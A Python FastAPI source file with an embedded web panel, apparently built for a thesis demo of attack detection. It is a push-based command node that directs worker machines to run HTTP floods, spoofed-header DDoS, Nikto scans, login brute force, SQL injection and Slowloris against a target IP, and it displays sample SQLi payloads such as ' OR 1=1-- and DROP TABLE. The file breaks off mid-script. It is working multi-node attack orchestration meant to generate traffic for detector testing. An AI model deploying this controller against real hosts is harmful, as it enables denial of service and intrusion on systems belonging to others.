"""
COMMANDER — главная атакующая нода (atk-1).
Push-модель: командер сам толкает команды воркерам, воркеры ничего не знают о командере.

API:
  GET    /status               — общий статус
  GET    /workers              — список воркеров
  POST   /workers/add          — добавить воркера  {"ip": "..."}
  DELETE /workers/{ip}         — удалить воркера
  POST   /workers/{ip}/run     — атака на конкретном воркере {"attack_type": "..."}
  POST   /workers/{ip}/stop    — остановить конкретного воркера
  POST   /attack/start         — запустить атаку на всех {"attack_type": "...", "target": "..."}
  POST   /attack/stop          — остановить всех
  POST   /target               — установить цель {"target": "..."}
  GET    /ui                   — веб-интерфейс
"""

import os
import sys
import time
import socket
import subprocess
import threading
import logging
import requests
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import uvicorn

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")
logger = logging.getLogger("commander")

TARGET  = os.getenv("TARGET_IP", "")
PORT    = int(os.getenv("CMD_PORT", 5000))
W_PORT  = int(os.getenv("WORKER_PORT", 5001))

_HERE = os.path.dirname(os.path.abspath(__file__))
A = lambda name: os.path.join(_HERE, "attacks", name)

app = FastAPI(title="Главная нода")

state = {
    "target":         TARGET,
    "attack_active":  False,
    "current_attack": None,
    "workers": {},
}

current_proc = None


# ─── Локальные атаки командера ────────────────────────────────────────────────
ATTACKS = {
    "flood":     lambda t: ["ab", "-n", "500000", "-c", "300", "-q", f"http://{t}/"],
    "ddos":      lambda t: [sys.executable, A("ddos_spoof.py"), t],
    "scan":      lambda t: ["nikto", "-h", f"http://{t}", "-maxtime", "120s", "-quiet"],
    "brute":     lambda t: [sys.executable, A("brute.py"), t],
    "sqli":      lambda t: [sys.executable, A("sqli.py"), t],
    "slowloris": lambda t: [sys.executable, A("slowloris.py"), t],
    "slow":      lambda t: ["wrk", "-t2", "-c20", "-d60s", f"http://{t}/search"],
}


def run_local(attack_type: str, target: str):
    global current_proc
    if current_proc and current_proc.poll() is None:
        current_proc.terminate()
    cmd = ATTACKS.get(attack_type, ATTACKS["flood"])(target)
    logger.info(f"[local] {attack_type} -> {target}")
    try:
        current_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError as e:
        logger.error(f"Команда не найдена: {e}")


def stop_local():
    global current_proc
    if current_proc and current_proc.poll() is None:
        current_proc.terminate()
    current_proc = None


# ─── Управление воркерами (push) ──────────────────────────────────────────────
def push_all(endpoint: str, data: dict | None = None):
    def _send(ip: str):
        try:
            r = requests.post(f"http://{ip}:{W_PORT}/{endpoint}", json=data or {}, timeout=3)
            state["workers"][ip]["status"] = r.json().get("status", "ok")
        except Exception as e:
            state["workers"][ip]["status"] = "offline"
            logger.warning(f"[{ip}] недоступен: {e}")

    threads = [threading.Thread(target=_send, args=(ip,), daemon=True)
               for ip in list(state["workers"])]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=4)


def check_worker(ip: str):
    try:
        r = requests.get(f"http://{ip}:{W_PORT}/status", timeout=2)
        info = r.json()
        state["workers"][ip].update({
            "hostname":       info.get("host", ip),
            "status":         info.get("status", "idle"),
            "current_attack": info.get("current_attack"),
            "last_checked":   time.time(),
        })
        # Расширенная статистика
        try:
            rs = requests.get(f"http://{ip}:{W_PORT}/stats", timeout=2)
            s = rs.json()
            state["workers"][ip].update({
                "elapsed_sec":    s.get("elapsed_sec", 0),
                "estimated_rps":  s.get("estimated_rps", 0),
                "estimated_reqs": s.get("estimated_reqs", 0),
                "sample_requests": s.get("sample_requests", []),
            })
        except Exception:
            pass
    except Exception:
        if ip in state["workers"]:
            state["workers"][ip]["status"] = "offline"


def check_all_workers():
    threads = [threading.Thread(target=check_worker, args=(ip,), daemon=True)
               for ip in list(state["workers"])]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=3)


def _bg_refresh():
    while True:
        time.sleep(5)
        if state["workers"]:
            check_all_workers()


threading.Thread(target=_bg_refresh, daemon=True).start()


# ─── API ─────────────────────────────────────────────────────────────────────
@app.get("/status")
def get_status():
    online = sum(1 for w in state["workers"].values()
                 if w.get("status") not in ("offline", "checking"))
    # Агрегированная статистика по всем атакующим нодам
    total_rps  = sum(w.get("estimated_rps", 0)  for w in state["workers"].values()
                     if w.get("status") == "attacking")
    total_reqs = sum(w.get("estimated_reqs", 0) for w in state["workers"].values()
                     if w.get("status") == "attacking")
    # Включаем главную ноду (local) если атакует
    _LOCAL_RPS = {"flood":300,"ddos":80,"scan":5,"brute":20,"sqli":10,"slowloris":2,"slow":40}
    if state["attack_active"] and state["current_attack"]:
        total_rps += _LOCAL_RPS.get(state["current_attack"], 0)
    return {
        "target":         state["target"],
        "attack_active":  state["attack_active"],
        "current_attack": state["current_attack"],
        "workers_total":  len(state["workers"]),
        "workers_online": online,
        "workers":        state["workers"],
        "total_rps":      round(total_rps),
        "total_reqs":     total_reqs,
    }


@app.get("/workers")
def get_workers():
    return state["workers"]


@app.post("/workers/add")
def add_worker(body: dict):
    ip = (body.get("ip") or "").strip()
    if not ip:
        return {"error": "ip required"}
    if ip not in state["workers"]:
        state["workers"][ip] = {
            "ip":             ip,
            "hostname":       ip,
            "status":         "checking",
            "current_attack": None,
            "last_checked":   0,
        }
        threading.Thread(target=check_worker, args=(ip,), daemon=True).start()
    return {"added": ip, "total": len(state["workers"])}


@app.delete("/workers/{worker_ip}")
def remove_worker(worker_ip: str):
    state["workers"].pop(worker_ip, None)
    return {"removed": worker_ip, "total": len(state["workers"])}


@app.post("/workers/{worker_ip}/run")
def run_single_worker(worker_ip: str, body: dict):
    if worker_ip not in state["workers"]:
        return {"error": "worker not found"}
    attack_type = body.get("attack_type", "flood")
    target      = body.get("target") or state["target"]
    if not target:
        return {"error": "target not set"}
    try:
        requests.post(f"http://{worker_ip}:{W_PORT}/run",
                      json={"attack_type": attack_type, "target": target}, timeout=3)
        state["workers"][worker_ip]["status"]         = "attacking"
        state["workers"][worker_ip]["current_attack"] = attack_type
    except Exception as e:
        state["workers"][worker_ip]["status"] = "offline"
        return {"error": str(e)}
    return {"status": "started", "worker": worker_ip, "attack": attack_type}


@app.post("/workers/{worker_ip}/stop")
def stop_single_worker(worker_ip: str):
    if worker_ip not in state["workers"]:
        return {"error": "worker not found"}
    try:
        requests.post(f"http://{worker_ip}:{W_PORT}/stop", timeout=3)
        state["workers"][worker_ip]["status"]         = "idle"
        state["workers"][worker_ip]["current_attack"] = None
    except Exception as e:
        state["workers"][worker_ip]["status"] = "offline"
        return {"error": str(e)}
    return {"status": "stopped", "worker": worker_ip}


@app.post("/attack/start")
def start_attack(body: dict):
    attack_type = body.get("attack_type", "flood")
    target      = body.get("target") or state["target"]
    if not target:
        return {"error": "target IP not set"}

    state["attack_active"]  = True
    state["current_attack"] = attack_type
    state["target"]         = target

    run_local(attack_type, target)
    push_all("run", {"attack_type": attack_type, "target": target})

    logger.info(f"Атака {attack_type} -> {target} | воркеров: {len(state['workers'])}")
    return {
        "status":           "started",
        "attack":           attack_type,
        "target":           target,
        "workers_notified": len(state["workers"]),
    }


@app.post("/attack/stop")
def stop_attack():
    state["attack_active"]  = False
    state["current_attack"] = None
    stop_local()
    push_all("stop")
    return {"status": "stopped"}


@app.post("/target")
def set_target(body: dict):
    state["target"] = (body.get("target") or state["target"]).strip()
    return {"target": state["target"]}


# ─── Веб-интерфейс ────────────────────────────────────────────────────────────
@app.get("/ui", response_class=HTMLResponse)
def ui():
    return _UI_HTML


_UI_HTML = r"""<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Главная нода — управление атакой</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',sans-serif;background:#0f0f0f;color:#c8c8c8;padding:20px;font-size:13px;max-width:1200px;margin:0 auto}
h1{color:#fff;font-size:19px;font-weight:600;margin-bottom:3px}
.sub{color:#555;font-size:11px;margin-bottom:14px}

/* Статус-строка */
.sbar{display:flex;gap:24px;background:#161616;border:1px solid #252525;border-radius:6px;padding:10px 16px;margin-bottom:14px;flex-wrap:wrap;align-items:center}
.sbar .si{display:flex;flex-direction:column;gap:1px}
.sbar .sl{font-size:9px;color:#444;text-transform:uppercase;letter-spacing:.6px}
.sbar .sv{font-size:13px;color:#ddd;font-weight:500}
.sbar .sv.on{color:#f80}.sbar .sv.ok{color:#4a4}

/* Двухколоночный макет */
.layout{display:grid;grid-template-columns:1fr 320px;gap:12px;align-items:start}

/* Карточки */
.card{background:#161616;border:1px solid #252525;border-radius:6px;padding:14px;margin-bottom:12px}
.ctitle{font-size:10px;font-weight:700;color:#555;text-transform:uppercase;letter-spacing:.8px;margin-bottom:10px}

input,select{width:100%;background:#0f0f0f;color:#ccc;border:1px solid #2e2e2e;border-radius:4px;padding:7px 9px;font-size:12px;margin-bottom:7px;font-family:inherit;transition:border-color .15s}
input:focus,select:focus{outline:none;border-color:#4a9}
input::placeholder{color:#3a3a3a}

.btn{background:transparent;border:1px solid #4a9;color:#4a9;border-radius:4px;padding:6px 13px;cursor:pointer;font-size:12px;transition:all .15s;font-family:inherit;white-space:nowrap}
.btn:hover{background:#4a9;color:#000}
.btn.full{width:100%;margin-top:4px}
.btn.danger{border-color:#c33;color:#c33;padding:9px;width:100%;margin-top:6px;font-size:13px;font-weight:600}
.btn.danger:hover{background:#c33;color:#fff}

/* Список атак */
.atk-list{display:flex;flex-direction:column;gap:8px}
.atk-row{background:#111;border:1px solid #222;border-radius:5px;padding:12px 14px;display:flex;align-items:flex-start;gap:14px;transition:border-color .15s}
.atk-row:hover{border-color:#333}
.atk-row.active-atk{border-color:#f80;background:#110f00}

.atk-left{flex:1;min-width:0}
.atk-head{display:flex;align-items:center;gap:8px;margin-bottom:5px}
.atk-name{font-size:13px;font-weight:600;color:#ddd}
.atk-badge{font-size:9px;padding:2px 6px;border-radius:3px;text-transform:uppercase;letter-spacing:.5px;font-weight:700}
.badge-flood{background:#1a0a00;color:#f80;border:1px solid #553300}
.badge-recon{background:#0a0a1a;color:#5af;border:1px solid #223355}
.badge-inject{background:#1a001a;color:#d4f;border:1px solid #442244}
.badge-exhaust{background:#001a0a;color:#4d4;border:1px solid #224422}
.badge-slow{background:#1a1a00;color:#cc4;border:1px solid #444400}

.atk-desc{font-size:12px;color:#888;line-height:1.55;margin-bottom:5px}
.atk-meta{display:flex;flex-wrap:wrap;gap:6px}
.meta-chip{font-size:10px;padding:2px 7px;border-radius:3px;background:#1a1a1a;color:#555;border:1px solid #222}
.meta-chip b{color:#777}

.atk-right{display:flex;flex-direction:column;align-items:flex-end;gap:6px;flex-shrink:0;padding-top:2px}
.atk-start{background:transparent;border:1px solid #555;color:#888;border-radius:4px;padding:6px 14px;cursor:pointer;font-size:12px;font-family:inherit;transition:all .2s;white-space:nowrap}
.atk-start:hover{border-color:#f80;color:#f80;background:#1a0e00}
.atk-start.running{border-color:#f80;color:#f80;background:#1a0e00}
.atk-status{font-size:10px;color:#444}

/* Правая колонка */
.dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
.dot.idle{background:#4a4}.dot.attacking{background:#f80}.dot.offline{background:#c33}.dot.checking{background:#444}
.witem{display:flex;align-items:center;gap:7px;padding:7px 0;border-bottom:1px solid #1e1e1e}
.witem:last-child{border-bottom:none}
.wname{flex:1;font-size:12px;color:#aaa;overflow:hidden;text-overflow:ellipsis}
.wstate{font-size:10px;color:#f80;min-width:52px;text-align:right}
.wstate.idle{color:#4a4}
.wa{display:flex;gap:3px;align-items:center}
.wa select{width:auto;margin:0;padding:3px 5px;font-size:10px}
.wa .btn{padding:3px 8px;font-size:10px}

#elog{max-height:110px;overflow-y:auto;font-size:11px;line-height:1.7;margin-top:6px}
.le .lt{color:#333}.le .lm{color:#888}
</style>
</head>
<body>

<h1>ГЛАВНАЯ НОДА</h1>
<p class="sub">Панель управления атакующей инфраструктурой · демонстрация для ВКР</p>

<div class="sbar">
  <div class="si"><span class="sl">Цель</span><span class="sv" id="sb-t">—</span></div>
  <div class="si"><span class="sl">Активная атака</span><span class="sv" id="sb-a">—</span></div>
  <div class="si"><span class="sl">Ноды онлайн</span><span class="sv" id="sb-w">0 / 0</span></div>
  <div class="si"><span class="sl">Статус</span><span class="sv" id="sb-s">ожидание</span></div>
</div>

<div class="layout">

<!-- Левая колонка: виды атак -->
<div>
  <div class="card" style="margin-bottom:8px;padding:10px 14px">
    <div style="display:flex;gap:8px;align-items:center">
      <input id="tip" placeholder="IP-адрес или хост цели (напр. 10.129.0.21)" style="margin:0;flex:1">
      <button class="btn" onclick="setTarget()">Установить цель</button>
    </div>
  </div>

  <div class="card">
    <div class="ctitle">Сценарии атак — запуск на всех нодах</div>
    <div class="atk-list" id="atk-list">

      <!-- HTTP Флуд -->
      <div class="atk-row" id="row-flood">
        <div class="atk-left">
          <div class="atk-head">
            <span class="atk-name">HTTP Флуд</span>
            <span class="atk-badge badge-flood">объёмная атака</span>
          </div>
          <div class="atk-desc">
            Инструмент <b>Apache Benchmark (ab)</b>: генерирует 500 000 GET-запросов
            к корневому URI (<code>/</code>) с 300 параллельными соединениями с одного IP-адреса.
            Цель — перегрузить веб-сервер количеством запросов.
          </div>
          <div class="atk-meta">
            <span class="meta-chip">Команда: <b>ab -n 500000 -c 300 http://TARGET/</b></span>
            <span class="meta-chip">RPS: <b>200–400</b></span>
            <span class="meta-chip">Уник. IP: <b>1</b></span>
            <span class="meta-chip">top_ip_share ≈ <b>1.0</b></span>
            <span class="meta-chip">Детектор: <b>уровень 3</b></span>
          </div>
        </div>
        <div class="atk-right">
          <button class="atk-start" onclick="attack('flood')">▶ Запустить</button>
          <span class="atk-status" id="st-flood">—</span>
        </div>
      </div>

      <!-- DDoS -->
      <div class="atk-row" id="row-ddos">
        <div class="atk-left">
          <div class="atk-head">
            <span class="atk-name">DDoS (имитация ботнета)</span>
            <span class="atk-badge badge-flood">объёмная атака</span>
          </div>
          <div class="atk-desc">
            Скрипт <b>ddos_spoof.py</b>: 20 потоков непрерывно шлют GET-запросы,
            подставляя случайный IP в заголовок <code>X-Forwarded-For</code>
            (имитация 500 разных источников из пула случайных адресов).
            User-Agent чередуется из 5 вариантов.
          </div>
          <div class="atk-meta">
            <span class="meta-chip">Потоки: <b>20</b></span>
            <span class="meta-chip">Задержка: <b>50–200 мс</b></span>
            <span class="meta-chip">Уник. IP: <b>~500 (фиктивные)</b></span>
            <span class="meta-chip">new_ip_ratio ≈ <b>1.0</b></span>
            <span class="meta-chip">Детектор: <b>уровень 2–3</b></span>
          </div>
        </div>
        <div class="atk-right">
          <button class="atk-start" onclick="attack('ddos')">▶ Запустить</button>
          <span class="atk-status" id="st-ddos">—</span>
        </div>
      </div>

      <!-- Сканирование -->
      <div class="atk-row" id="row-scan">
        <div class="atk-left">
          <div class="atk-head">
            <span class="atk-name">Сканирование уязвимостей</span>
            <span class="atk-badge badge-recon">разведка</span>
          </div>
          <div class="atk-desc">
            Инструмент <b>Nikto</b>: автоматический сканер, проверяет ~6 700 потенциально
            опасных URI (<code>/wp-admin</code>, <code>/.env</code>, <code>/phpmyadmin</code>,
            <code>/actuator</code> и др.) в поиске известных уязвимостей и конфигурационных файлов.
          </div>
          <div class="atk-meta">
            <span class="meta-chip">Команда: <b>nikto -h http://TARGET -maxtime 120s</b></span>
            <span class="meta-chip">Доля 404: <b>&gt; 70%</b></span>
            <span class="meta-chip">uri_entropy: <b>высокая</b></span>
            <span class="meta-chip">suspicious_uri_ratio: <b>~1.0</b></span>
            <span class="meta-chip">Детектор: <b>уровень 2</b></span>
          </div>
        </div>
        <div class="atk-right">
          <button class="atk-start" onclick="attack('scan')">▶ Запустить</button>
          <span class="atk-status" id="st-scan">—</span>
        </div>
      </div>

      <!-- Перебор паролей -->
      <div class="atk-row" id="row-brute">
        <div class="atk-left">
          <div class="atk-head">
            <span class="atk-name">Перебор паролей (Brute Force)</span>
            <span class="atk-badge badge-inject">атака учётных данных</span>
          </div>
          <div class="atk-desc">
            Скрипт <b>brute.py</b>: непрерывно шлёт POST-запросы на
            <code>/login</code> со случайными парами логин/пароль (~20 req/s).
            Имитирует автоматизированный подбор учётных данных.
          </div>
          <div class="atk-meta">
            <span class="meta-chip">Метод: <b>POST /login</b></span>
            <span class="meta-chip">Скорость: <b>~20 req/s</b></span>
            <span class="meta-chip">Доля 4xx: <b>&gt; 80%</b></span>
            <span class="meta-chip">top_uri_share ≈ <b>1.0</b></span>
            <span class="meta-chip">Детектор: <b>уровень 2</b></span>
          </div>
        </div>
        <div class="atk-right">
          <button class="atk-start" onclick="attack('brute')">▶ Запустить</button>
          <span class="atk-status" id="st-brute">—</span>
        </div>
      </div>

      <!-- SQL-инъекция -->
      <div class="atk-row" id="row-sqli">
        <div class="atk-left">
          <div class="atk-head">
            <span class="atk-name">SQL-инъекция</span>
            <span class="atk-badge badge-inject">инъекция</span>
          </div>
          <div class="atk-desc">
            Скрипт <b>sqli.py</b>: отправляет GET/POST запросы с 15 классическими
            SQL-пейлоадами (<code>' OR 1=1--</code>, <code>UNION SELECT</code>,
            <code>SLEEP(3)</code> и др.) к эндпоинтам
            <code>/search</code>, <code>/login</code>, <code>/api/data</code>.
          </div>
          <div class="atk-meta">
            <span class="meta-chip">Пейлоадов: <b>15</b></span>
            <span class="meta-chip">Эндпоинтов: <b>4</b></span>
            <span class="meta-chip">Доля 4xx/5xx: <b>высокая</b></span>
            <span class="meta-chip">suspicious_uri_ratio: <b>высокий</b></span>
            <span class="meta-chip">Детектор: <b>уровень 2</b></span>
          </div>
        </div>
        <div class="atk-right">
          <button class="atk-start" onclick="attack('sqli')">▶ Запустить</button>
          <span class="atk-status" id="st-sqli">—</span>
        </div>
      </div>

      <!-- Slowloris -->
      <div class="atk-row" id="row-slowloris">
        <div class="atk-left">
          <div class="atk-head">
            <span class="atk-name">Slowloris</span>
            <span class="atk-badge badge-exhaust">исчерпание ресурсов</span>
          </div>
          <div class="atk-desc">
            Скрипт <b>slowloris.py</b>: открывает 200 TCP-соединений и удерживает их
            незавершёнными — заголовки HTTP передаются по одному, с паузами между
            байтами. Истощает пул worker-соединений nginx, не генерируя большого трафика.
          </div>
          <div class="atk-meta">
            <span class="meta-chip">Соединений: <b>200</b></span>
            <span class="meta-chip">RPS: <b>низкий (&lt; 5)</b></span>
            <span class="meta-chip">avg_request_time: <b>очень высокое</b></span>
            <span class="meta-chip">p95_time: <b>аномальный</b></span>
            <span class="meta-chip">Детектор: <b>уровень 1–2</b></span>
          </div>
        </div>
        <div class="atk-right">
          <button class="atk-start" onclick="attack('slowloris')">▶ Запустить</button>
          <span class="atk-status" id="st-slowloris">—</span>
        </div>
      </div>

      <!-- Медленный флуд -->
      <div class="atk-row" id="row-slow">
        <div class="atk-left">
          <div class="atk-head">
            <span class="atk-name">Медленный флуд</span>
            <span class="atk-badge badge-slow">умеренная нагрузка</span>
          </div>
          <div class="atk-desc">
            Инструмент <b>wrk</b>: 2 потока, 20 параллельных соединений в течение 60 секунд,
            запросы к <code>/search</code>. Имитирует продолжительную умеренную нагрузку
            с высокой концентрацией запросов на один URI.
          </div>
          <div class="atk-meta">
            <span class="meta-chip">Команда: <b>wrk -t2 -c20 -d60s /search</b></span>
            <span class="meta-chip">RPS: <b>30–80</b></span>
            <span class="meta-chip">top_uri_share ≈ <b>1.0</b></span>
            <span class="meta-chip">Уник. IP: <b>1</b></span>
            <span class="meta-chip">Детектор: <b>уровень 1–2</b></span>
          </div>
        </div>
        <div class="atk-right">
          <button class="atk-start" onclick="attack('slow')">▶ Запустить</button>
          <span class="atk-status" id="st-slow">—</span>
        </div>
      </div>

    </div><!-- /atk-list -->

    <button class="btn danger" onclick="stopAll()">⏹ ОСТАНОВИТЬ ВСЕ НОДЫ</button>
  </div>
</div><!-- /left -->

<!-- Правая колонка -->
<div>
  <div class="card">
    <div class="ctitle">Дополнительные ноды <span id="w-count" style="color:#333">(0)</span></div>
    <input id="wip" placeholder="IP дополнительной ноды">
    <button class="btn full" onclick="addWorker()">+ Добавить ноду</button>
    <div id="wlist" style="margin-top:10px">
      <span style="color:#333;font-size:11px">Нет дополнительных нод.<br>Главная нода атакует самостоятельно.</span>
    </div>
  </div>

  <!-- Атакующий трафик -->
  <div class="card" style="margin-bottom:10px">
    <div class="ctitle">Атакующий трафик — что ноды отправляют на цель</div>
    <div id="traf"><span style="color:#333;font-size:12px">Нет активных атак</span></div>
  </div>

  <div class="card" style="margin-bottom:10px">
    <div class="ctitle">Активные ноды</div>
    <div id="act" style="font-size:12px;line-height:1.9;min-height:36px">
      <span style="color:#333">Нет активных атак</span>
    </div>
  </div>

  <div class="card">
    <div class="ctitle">Журнал событий</div>
    <div id="elog"></div>
  </div>
</div><!-- /right -->

</div><!-- /layout -->

<script>
const B = window.location.origin;
const ATK = ['flood','ddos','scan','brute','sqli','slowloris','slow'];
const LABEL = {flood:'HTTP Флуд',ddos:'DDoS (ботнет)',scan:'Сканирование',
               brute:'Перебор паролей',sqli:'SQL-инъекция',slowloris:'Slowloris',
               slow:'Медленный флуд'};
let _prev = {}, _curAtk = null;

function ts() { return new Date().toLocaleTimeString(); }
function addLog(msg, c) {
  const el = document.getElementById('elog');
  const d = document.createElement('div'); d.className = 'le';
  d.innerHTML = '<span class="lt">['+ts()+']</span> <span class="lm" style="color:'+(c||'#6af')+'">'+msg+'</span>';
  el.insertBefore(d, el.firstChild);
  if (el.children.length > 40) el.removeChild(el.lastChild);
}
async function api(p, m, b) {
  const r = await fetch(B+p, {method:m||'GET',
    headers: b ? {'Content-Type':'application/json'} : {},
    body: b ? JSON.stringify(b) : undefined});
  return r.json();
}

async function setTarget() {
  const t = document.getElementById('tip').value.trim();
  if (!t) { addLog('Введите IP цели', '#c33'); return; }
  await api('/target','POST',{target:t});
  addLog('Цель установлена: '+t, '#4a4');
  refresh();
}

async function addWorker() {
  const ip = document.getElementById('wip').value.trim();
  if (!ip) { addLog('Введите IP ноды', '#c33'); return; }
  const d = await api('/workers/add','POST',{ip});
  if (d.error) { addLog('Ошибка: '+d.error,'#c33'); return; }
  document.getElementById('wip').value = '';
  addLog('Нода добавлена: '+ip, '#4a4');
  refresh();
}

async function removeWorker(ip) {
  await api('/workers/'+encodeURIComponent(ip),'DELETE');
  addLog('Нода удалена: '+ip,'#c33'); refresh();
}

function setAtkHighlight(type) {
  ATK.forEach(t => {
    const r = document.getElementById('row-'+t);
    const b = document.querySelector('#row-'+t+' .atk-start');
    if (!r) return;
    if (t === type) { r.classList.add('active-atk'); if(b) b.classList.add('running'); }
    else            { r.classList.remove('active-atk'); if(b) b.classList.remove('running'); }
  });
  ATK.forEach(t => {
    const el = document.getElementById('st-'+t);
    if (!el) return;
    el.textContent = t === type ? 'активна' : '—';
    el.style.color = t === type ? '#f80' : '#444';
  });
}

async function attack(type) {
  const target = document.getElementById('tip').value.trim() || undefined;
  const d = await api('/attack/start','POST',{attack_type:type,target});
  if (d.error) { addLog('Ошибка: '+d.error,'#c33'); return; }
  _curAtk = type;
  setAtkHighlight(type);
  addLog((LABEL[type]||type)+' запущена → '+d.target+' (нод: '+d.workers_notified+')', '#f80');
}

async function stopAll() {
  await api('/attack/stop','POST');
  _curAtk = null;
  setAtkHighlight(null);
  addLog('Все атаки остановлены','#c33');
}

async function runWorker(ip) {
  const s = document.getElementById('ws-'+ip);
  const type = s ? s.value : 'flood';
  const target = document.getElementById('tip').value.trim() || undefined;
  const d = await api('/workers/'+encodeURIComponent(ip)+'/run','POST',{attack_type:type,target});
  if (d.error) { addLog('['+ip+'] '+d.error,'#c33'); return; }
  addLog('['+ip+'] '+(LABEL[type]||type), '#f80');
}

async function stopWorker(ip) {
  await api('/workers/'+encodeURIComponent(ip)+'/stop','POST');
  addLog('['+ip+'] остановлен','#888');
}

function dotC(s) { return s==='attacking'?'attacking':s==='offline'?'offline':s==='checking'?'checking':'idle'; }

async function refresh() {
  try {
    const d = await api('/status');
    document.getElementById('sb-t').textContent = d.target||'—';
    const ca = d.current_attack;
    document.getElementById('sb-a').textContent = ca ? (LABEL[ca]||ca) : '—';
    document.getElementById('sb-w').textContent = d.workers_online+' / '+d.workers_total;
    const ss = document.getElementById('sb-s');
    ss.textContent = d.attack_active ? 'атака активна' : 'ожидание';
    ss.className = 'sv '+(d.attack_active ? 'on' : 'ok');

    if (!document.getElementById('tip').value && d.target)
      document.getElementById('tip').value = d.target;

    if (d.attack_active && d.current_attack && d.current_attack !== _curAtk) {
      _curAtk = d.current_attack; setAtkHighlight(_curAtk);
    } else if (!d.attack_active && _curAtk) {
      _curAtk = null; setAtkHighlight(null);
    }

    // ── Генерируемый трафик ──────────────────────────────────────────────────
    const traf = document.getElementById('traf');
    const atkg = Object.entries(d.workers||{}).filter(([,w])=>w.status==='attacking');

    // Локальные примеры запросов (главная нода)
    const LOCAL_SAMPLES = {
      flood:    ['GET / HTTP/1.1','Host: TARGET','User-Agent: ApacheBench/2.3','Connection: Keep-Alive','','← 300 параллельных соединений'],
      ddos:     ['GET / HTTP/1.1','Host: TARGET','X-Forwarded-For: 185.220.x.x  ← случайный','X-Real-IP: 185.220.x.x','User-Agent: Mozilla/5.0 ...','','← IP меняется каждый запрос'],
      scan:     ['GET /wp-admin HTTP/1.1','GET /.env HTTP/1.1','GET /phpmyadmin HTTP/1.1','GET /actuator/env HTTP/1.1','GET /.git/HEAD HTTP/1.1','','← Nikto: ~6700 URI'],
      brute:    ['POST /login HTTP/1.1','Content-Type: application/x-www-form-urlencoded','','username=admin&password=qwerty123','username=root&password=password','','← ~20 req/s, случайные пары'],
      sqli:     ["GET /search?q=' OR 1=1-- HTTP/1.1","GET /api/data?id=1 UNION SELECT null-- HTTP/1.1","POST /login → username=admin'--&password=x","GET /user?name=' DROP TABLE users--","","← 15 пейлоадов × 4 эндпоинта"],
      slowloris:['GET / HTTP/1.1\\r\\n','Host: TARGET\\r\\n','X-a: b\\r\\n  [пауза 10с]','X-b: c\\r\\n  [пауза 10с]','[заголовок не завершён]','','← 200 незавершённых соединений'],
      slow:     ['GET /search HTTP/1.1','Host: TARGET','User-Agent: wrk/4.2.0','Connection: keep-alive','','← wrk: 2 потока, 15 соединений, 60с'],
    };

    if (!d.attack_active && !atkg.length) {
      traf.innerHTML = '<span style="color:#333;font-size:12px">Нет активных атак</span>';
    } else {
      const totalRps  = d.total_rps  || 0;
      const totalReqs = d.total_reqs || 0;

      // Блок одной ноды: stats + пример HTTP-запроса
      function nodeBlock(name, atk, rps, reqs, ela, sampleLines) {
        const safeLines = (sampleLines||[]).map(l=>{
          const isComment = l.startsWith('←') || l==='' ;
          return '<span style="color:'+(isComment?'#555':'#7af')+'">'+
            l.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
            +'</span>';
        }).join('<br>');
        return '<div style="background:#0a0a0a;border:1px solid #1e1e1e;border-radius:4px;'
          +'padding:8px 10px;margin-bottom:8px">'
          // Header row
          +'<div style="display:flex;justify-content:space-between;align-items:center;'
          +'margin-bottom:6px;padding-bottom:5px;border-bottom:1px solid #1a1a1a">'
          +'<span style="color:#f80;font-weight:600;font-size:12px">'+name+'</span>'
          +'<span style="font-size:11px;color:#555">'+(LABEL[atk]||atk||'—')+'</span>'
          +'<span style="font-size:11px;color:#aaa">~'+rps+' req/s</span>'
          +'<span style="font-size:11px;color:#666">~'+(reqs||0).toLocaleString()+' отпр.</span>'
          +(ela?'<span style="font-size:10px;color:#333">'+ela+'с</span>':'')
          +'</div>'
          // HTTP sample
          +'<pre style="margin:0;font-size:11px;line-height:1.6;font-family:monospace;'
          +'overflow-x:auto;white-space:pre-wrap">'+ safeLines +'</pre>'
          +'</div>';
      }

      let html = '<div style="margin-bottom:10px;padding:6px 8px;background:#0d0d0d;'
        +'border:1px solid #1e1e1e;border-radius:4px;display:flex;gap:20px;align-items:center">'
        +'<span style="color:#bbb;font-size:12px">Суммарный RPS:</span>'
        +'<span style="color:#f80;font-weight:700;font-size:18px">~'+totalRps+'</span>'
        +'<span style="color:#555;font-size:11px">отправлено: ~'+totalReqs.toLocaleString()+' запросов</span>'
        +'</div>';

      // Главная нода
      if (d.attack_active && ca) {
        const localRps={flood:300,ddos:80,scan:5,brute:20,sqli:10,slowloris:2,slow:40};
        html += nodeBlock('главная нода (local)', ca, localRps[ca]||0, null, null,
          LOCAL_SAMPLES[ca]);
      }

      // Воркеры
      atkg.forEach(([ip,w])=>{
        const name = (w.hostname&&w.hostname!==ip)?w.hostname:ip;
        html += nodeBlock(name, w.current_attack,
          w.estimated_rps||0, w.estimated_reqs||0, w.elapsed_sec||0,
          w.sample_requests||LOCAL_SAMPLES[w.current_attack]);
      });

      traf.innerHTML = html;
    }

    // Активные ноды
    const act = document.getElementById('act');
    if (d.attack_active && ca) {
      act.innerHTML = '<div style="border-left:2px solid #f80;padding-left:8px">'
        +'<span style="color:#f80;font-weight:600">'+(LABEL[ca]||ca)+'</span>'
        +(d.target ? '<span style="color:#555"> → '+d.target+'</span>' : '')
        +(atkg.length ? '<br><span style="color:#333;font-size:10px">+'+atkg.length+' нод</span>' : '')
        +'</div>';
    } else {
      act.innerHTML = '<span style="color:#333">Нет активных атак</span>';
    }

    // События
    Object.entries(d.workers||{}).forEach(([ip,w])=>{
      const prev = _prev[ip];
      if (prev !== undefined && prev !== w.status) {
        if (w.status==='attacking') addLog('['+ip+'] '+(LABEL[w.current_attack]||w.current_attack),'#f80');
        else if (prev==='attacking') addLog('['+ip+'] остановлен','#888');
        else if (w.status==='offline') addLog('['+ip+'] недоступен','#c33');
        else if (prev==='offline') addLog('['+ip+'] подключился','#4a4');
      }
      _prev[ip] = w.status;
    });

    // Ноды
    const keys = Object.keys(d.workers||{});
    document.getElementById('w-count').textContent = '('+keys.length+')';
    const wl = document.getElementById('wlist');
    if (!keys.length) {
